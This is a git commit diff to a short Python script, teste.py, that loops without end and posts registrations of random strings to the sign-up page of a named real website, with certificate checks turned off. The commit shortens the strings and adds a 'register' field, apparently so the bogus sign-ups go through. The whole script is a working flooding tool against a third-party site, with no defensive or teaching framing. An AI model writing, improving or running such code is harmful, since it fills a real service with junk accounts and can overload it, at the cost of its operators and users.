cfa14b161516a00c6a0360d0a0c348e8bc2c6393
TheHoltz <38303017+TheHoltz@users.noreply.github.com>
2018-12-03 23:45:39 -0200

    Update teste.py

--- teste.py
+++ teste.py
@@ -7,10 +7,11 @@ url = 'https://www.minemarket.com.br/register/'
 lis=list(ascii_lowercase)
 
 while(1):
-    ii = ''.join(choice(lis) for _ in range(5000))
+    ii = ''.join(choice(lis) for _ in range(1000))
     requests.post(url, allow_redirects=False, verify=False, data={
         'name': ii,
         'mail': ii+'@'+'whit3own4.com',
-        'pass': ii
+        'pass': ii,
+        'register': ''
     })
     print("Pacote com sucesso: %.15s"%ii);
